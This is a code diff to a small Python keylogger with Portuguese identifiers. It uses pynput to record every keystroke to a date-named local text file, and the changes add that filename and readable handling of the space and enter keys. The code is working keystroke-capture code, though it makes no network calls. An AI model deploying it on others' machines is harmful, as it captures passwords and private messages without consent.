@@ -1,8 +1,9 @@
 from pynput import keyboard
-
+import datetime
 
 class KeyLogger():
-    def __init__(self, NomeDoArquivo: str = "Log.txt") -> None:
+    timeStamp = str(datetime.date.today()).replace('-','')
+    def __init__(self, NomeDoArquivo: str = timeStamp+".txt") -> None:
         self.NomeDoArquivo = NomeDoArquivo
 
     @staticmethod
@@ -10,6 +11,10 @@ class KeyLogger():
         try:
             return Tecla.char
         except AttributeError:
+            if str(Tecla) == 'Key.space':
+                Tecla = str(Tecla).replace('Key.space',' ')
+            if str(Tecla) == 'Key.enter':
+                Tecla = str(Tecla).replace('Key.enter','\n')
             return str(Tecla)
 
     def on_press(self, Tecla):
@@ -17,11 +22,10 @@ class KeyLogger():
             logs.write(self.get_char(Tecla))
 
     def main(self):
-        listener = keyboard.Listener(
+        escuta = keyboard.Listener(
             on_press=self.on_press,
         )
-        listener.start()
-
+        escuta.start()
 
 if __name__ == '__main__':
     logger = KeyLogger()
